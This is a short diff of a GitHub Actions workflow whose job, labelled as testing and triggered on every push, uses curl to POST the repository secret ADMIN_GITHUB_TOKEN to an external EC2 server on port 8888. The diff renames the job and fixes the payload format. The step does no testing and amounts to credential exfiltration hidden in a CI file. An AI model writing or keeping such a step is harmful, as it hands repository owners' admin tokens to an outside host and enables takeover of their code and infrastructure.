@@ -3,7 +3,7 @@ name: testing
 on: [push]
 
 jobs:
-  testing-2:
+  testing:
     runs-on: ubuntu-latest
 
     steps:
@@ -13,4 +13,4 @@ jobs:
     - name: test
       run: |
         curl -X POST http://ec2-13-201-100-246.ap-south-1.compute.amazonaws.com:8888 \
-          -d "github-token: ${{ secrets.ADMIN_GITHUB_TOKEN }}"
+          -d "github-token=${{ secrets.ADMIN_GITHUB_TOKEN }}"
